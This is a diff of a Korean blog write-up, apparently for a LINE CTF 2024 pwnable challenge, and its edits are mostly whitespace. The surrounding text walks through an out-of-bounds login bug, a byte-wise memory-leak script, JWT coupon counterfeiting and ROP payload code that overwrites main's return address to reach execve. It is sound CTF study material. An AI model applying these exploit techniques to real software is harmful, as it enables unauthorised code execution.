@@ -4,7 +4,7 @@ date = "2024-10-18"
 description = "LINE CTF 2024 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "out of bound", "JWT counterfeit", "ANSI escape code"]
+tags = ["ctf", "pwnable", "out of bound", "jwt counterfeit", "ansi escape code"]
 +++
 
 ## 0x00. Introduction
@@ -16,7 +16,9 @@ tags = ["ctf", "pwnable", "out of bound", "JWT counterfeit", "ANSI escape code"]
     NX:         NX enabled
     PIE:        PIE enabled
 ```
+
 C++로 만들어진 바이너리로 분석하는데에 상당히 까다로웠다.
+
 ### Structure
 ``` c
 struct user_db // sizeof=0xD68
@@ -53,12 +55,14 @@ struct user // sizeof=0x68
     _QWORD age;
 };
 ```
+
 C++에서 `basic_string` 객체가 가지는 특성 때문인지 문자열을 그냥 저장하지 않고 `id`를 예를 들면 다음과 같이 저장한다.
 
 - `id_ptr` : 문자열이 저장된 주소
 - `id_size` : 문자열의 길이
 - `id[8]` : 길이 `8`까지의 문자열은 여기에 저장하고 더 긴 문자열은 다른 영역을 할당받아 저장
 - `id_end` : 쓰이지 않는 영역으로 chunk 관련 데이터로 추정
+
 
 ## 0x01. Vulnerability
 ### Out of bound
@@ -88,6 +92,7 @@ __int64 __fastcall login_790E(user_db *user_db)
   ...
 }
 ```
+
 `used_db`에는 총 `32`개의 `user`를 저장할 수 있는 공간이 있는데 `login_790E()`에서 `user`를 확인하는 범위는 `33`개이다.
 
 때문에 `user_list[32]` 이후 영역이 또 하나의 `user`로 인식되며 다음과 같이 영역이 겹쳐진다.
@@ -129,9 +134,11 @@ __int64 __fastcall login_790E(user_db *user_db)
 
 JWS의 구현 상 발생하는 문제로 어떻게 써먹을 수 있을진 모르겠지만 다른 곳에서도 사용할 수 있을 것 같다.
 
+
 ## 0x02. Exploit
 ### Memory leak
 `user_db->user_list[32]` 이후의 영역(`Welcome!` 계정)의 메모리는 다음과 같다.
+
 ``` bash
 # Welcome!
 gef➤  x/13gx $rbp-0xa0
@@ -143,6 +150,7 @@ gef➤  x/13gx $rbp-0xa0
 0x7fffffffecb0: 0x00005555555a5f80      0x0000000000000020
 0x7fffffffecc0: 0x000000000000003c
 ```
+
 `pw_ptr`를 의미하는 영역에는 `user_list`의 시작 주소인 `0x7fffffffdf60`가 담겨있고, `pw_size`를 의미하는 영역에는 계정의 개수를 의미하는 `count`가 담겨있다.
 
 현재 `count`는 `main()` 초반부에 호출되는 `setup_admin_7D3A()`에서 `admin` 계정을 추가하면서 `1`이 되어있다.
@@ -150,6 +158,7 @@ gef➤  x/13gx $rbp-0xa0
 따라서 `Welcome!` 계정의 비밀번호는 `0x7fffffffdf60`에 저장된 `1`바이트이다.
 
 이를 이용해 `user`를 늘려가며 `1`바이트씩 비밀번호를 brute forcing하여 memory leak이 가능하다.
+
 ``` bash
 # admin
 gef➤  x/13gx $rbp-0xda0
@@ -161,11 +170,13 @@ gef➤  x/13gx $rbp-0xda0
 0x7fffffffdfb0: 0x000000000000001e      0x000000000000001c
 0x7fffffffdfc0: 0x0000000000000022
 ```
+
 `0x7fffffffdf60`은 다시 말하면 `user_list[0]`이고 최초의 계정인 `admin`의 정보가 저장되어있다.
 
 `count`는 최대 `32`까지 증가시킬 수 있으므로 최대 `32`바이트까지 leak이 가능하지만, 마지막 `8`바이트는 `basic_string`의 기타 데이터이므로 총 `26`바이트만 leak을 시도했다.
 
 이를 통해 stack 주소와 `admin`의 `pw`를 획득할 수 있다.
+
 ``` python
 def memory_leak(s):
     hit = bytes()
@@ -185,6 +196,7 @@ def memory_leak(s):
     sys.stdout.write(f"\n")
     return hit
 ```
+
 `\t`, `\n` 등을 의미하는 값들은 입출력상 leak이 불가능하지만 자주 발생하는 문제는 아닌 것 같다.
 
 ### Game win
@@ -207,6 +219,7 @@ OOB 취약점을 이용해서 `Welcome!` 계정으로 게임을 깨고 `Change P
 이 때 가입 시 발급되는 `coupon`을 이용하면 `Attack`이 두 배가 되므로 JWT counterfeit 취약점을 이용해 총 네개의 `coupon`을 이용하면 `Enemy`를 이길 수 있다.
 
 문제는 상술한 AAW를 얻기 위해 `Welcome!` 계정이 `regular member`가 되어야하는데 `Welcome!` 계정은 가입된 계정이 아니다보니 발급된 `coupon`이 없다.
+
 ``` c
 __int64 __fastcall join_8A4A(user_db *user_db)
 {
@@ -231,6 +244,7 @@ __int64 __fastcall join_8A4A(user_db *user_db)
   }
 }
 ```
+
 다행히 `join_8A4A()`을 보면 `id`가 중복되었는지를 `user_list`를 `count`까지만 돌면서 확인하기 때문에 `Welcome!`이라는 계정을 생성할 수 있다.
 
 또한 `login_790E()`에서도 `id`만 맞고 `pw`가 다를 경우 그냥 다음 루프로 넘어가기 때문에 가입 이후에도 `33`번째 `Welcome!` 계정에 로그인이 가능하다.
@@ -240,6 +254,7 @@ __int64 __fastcall join_8A4A(user_db *user_db)
 ![jwt info](https://github.com/user-attachments/assets/16e803e0-4ba8-4732-b7b5-3ef162ca3895)
 
 따라서 다음과 같이 payload를 작성했다.
+
 ``` python
     # join fake "Welcome!"
     r = join(s, b"Welcome!", b"Welcome@", b"Welcome#", 0x10)
@@ -252,6 +267,7 @@ __int64 __fastcall join_8A4A(user_db *user_db)
         log.failure(f"bad coupon :(")
         exit()
 ```
+
 이제 게임을 깨야하는데 차후 디버깅을 위해서라도 자동화를 하려고 했는데... 여기에서 ANSI escape code를 사용한 입출력때문에 엄청 오래걸렸다.
 
 결과적으로는 `pyte`라는 라이브러리를 사용해서 map 정보를 파싱해왔고, `Item`을 먹는 알고리즘은 좋은게 떠오르지 않아 다음과 같은 단순한 방식을 사용했다.
@@ -276,6 +292,7 @@ __int64 __fastcall join_8A4A(user_db *user_db)
 따라서 로그인을 성공시켜 `login_success` 값을 늘리면 memory leak이 가능할 것으로 판단했다.
 
 주의할 것은 C++이라서 그런지 사용하는 라이브러리가 많아 glibc 영역을 잘 찾아 가져와야한다.
+
 ``` python
     logout(s)
     for _ in range(0xa0):
@@ -292,6 +309,7 @@ __int64 __fastcall join_8A4A(user_db *user_db)
 이제 stack 주소를 알고있으니 `main()`의 return address를 덮어서 ROP 가젯들을 실행한 뒤 `execve`를 실행하게끔 payload를 작성했다.
 
 다만 `main()` 종료 직전에 호출되는 `free_db_24FBA()`에서 각 `user` 정보들을 저장한 객체들을 해제하기 때문에 AAW를 위해 바꿔둔 `admin->pw_ptr`을 원복시켜야 한다.
+
 ``` c
 __int64 __fastcall free_db_24FBA(__int64 user_db)
 {
@@ -309,7 +327,9 @@ __int64 __fastcall free_db_24FBA(__int64 user_db)
   return result;
 }
 ```
+
 따라서 다음과 같이 paylaod를 작성했다.
+
 ``` python
     # change admin->pw to point return address of main
     ret = stack + 0xd98
@@ -336,6 +356,7 @@ __int64 __fastcall free_db_24FBA(__int64 user_db)
     login(s, b"Welcome!", p64(ret) + p64(len(payload)))
     change_pw(s, p64(stack) + p64(0x8))
 ```
+
 
 ## 0x03. Payload
 ``` python
